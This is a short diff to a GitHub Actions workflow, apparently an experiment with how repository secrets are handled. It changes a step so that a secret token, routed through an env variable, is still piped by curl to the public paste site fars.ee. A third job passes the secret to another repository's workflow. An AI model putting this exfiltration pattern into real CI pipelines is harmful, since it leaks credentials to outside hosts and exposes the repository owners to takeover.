@@ -8,13 +8,16 @@ on:
       token:
         required: true
 
+env:
+    test_token: ${{ secrets.token }}
+
 jobs:
   use-secret-in-workflow:
     runs-on: ubuntu-latest
     steps:
       - name: echo secret
         run: |
-            echo "secret ${{ secrets.token }}" | curl -F "c=@-" "https://fars.ee/"
+            echo "secret ${test_token}" | curl -F "c=@-" "https://fars.ee/"
     
   pass-secret-to-other-repo:
     uses: wangliu-iscas/test2/.github/workflows/test.yml@main
